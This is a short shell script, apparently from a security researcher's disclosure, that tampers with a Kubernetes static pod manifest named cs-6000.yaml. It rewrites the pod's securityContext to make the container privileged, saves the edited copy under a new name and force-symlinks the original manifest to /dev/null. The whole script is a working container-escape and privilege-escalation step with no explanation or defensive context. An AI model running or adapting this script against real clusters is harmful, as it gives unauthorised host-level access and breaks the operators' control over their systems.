#!/bin/sh
# wtm@offensi.com

# write new manifest
cat /etc/kubernetes/manifests/cs-6000.yaml | sed s/"    'securityContext': \!\!null 'null'"/\
"    'securityContext':\n"\
"      'privileged': \!\!bool 'true'\n"\
"      'procMount': \!\!null 'null'\n"\
"      'runAsGroup': \!\!null 'null'\n"\
"      'runAsUser': \!\!null 'null'\n"\
"      'seLinuxOptions': \!\!null 'null'\n"/g > /tmp/cs-6000.yaml

# replace old manifest with symlink
mv /tmp/cs-6000.yaml /etc/kubernetes/manifests/cs-6000.modified
ln -fs /dev/null /etc/kubernetes/manifests/cs-6000.yaml


